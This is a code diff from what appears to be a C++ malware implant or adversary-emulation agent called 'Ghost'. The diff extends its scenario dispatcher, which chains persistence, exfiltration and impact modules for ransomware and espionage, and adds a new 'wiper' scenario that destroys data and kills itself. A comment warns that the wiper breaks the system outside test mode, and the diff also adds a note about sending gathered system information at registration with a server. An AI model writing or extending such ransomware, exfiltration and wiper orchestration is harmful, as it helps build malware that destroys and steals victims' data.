@@ -58,13 +58,18 @@ void Ghost::runScenario(ScenarioType type) {
     switch (type) {
         #ifdef SCENARIO_RANSOMWARE
         case ScenarioType::RANSOMWARE:
+            LOG_INFO("[SCENARIO] Executing ransomware")
+
             modules["PERSIST"]->execute();  // TODO: make this more granular with specific method instead of the orchestrating module
             modules["EXFIL"]->execute();
             modules["IMPACT"]->execute();
             // TODO: leave a ransom note
             break;
-        #elif defined(SCENARIO_ESPIONAGE)
+        #endif
+        #ifdef SCENARIO_ESPIONAGE
         case ScenarioType::ESPIONAGE:
+            LOG_INFO("[SCENARIO] Executing espionage")
+
             modules["GATHER"]->execute();
             modules["EXFIL"]->execute();
             // modules["PERSIST"]->execute();
@@ -73,6 +78,16 @@ void Ghost::runScenario(ScenarioType type) {
             // TODO: adjust that
             this->run();
             break;
+        #endif
+        #ifdef SCENARIO_WIPER
+        case ScenarioType::WIPER:
+            LOG_INFO("[SCENARIO] Executing wiper")
+
+            modules["IMPACT"]->execute();
+
+            cleanup();
+            destroy();
+            exit(0);    // this WILL break the system if used with mode other than TEST, so we just kill the module instantly on success
         #endif
         default:
             LOG_ERROR("No valid scenario detected")
@@ -84,6 +99,7 @@ void Ghost::runScenario(ScenarioType type) {
 bool Ghost::reg() {
     LOG_INFO("Trying to register GHOST [{}]", this->uuid)
 
+    // TODO: check here if gathering module is present. if yes, gather the sysinfo (if present) and send in payload
     json payload = {
         {"id", this->uuid},
         {"hostname", this->hostname},
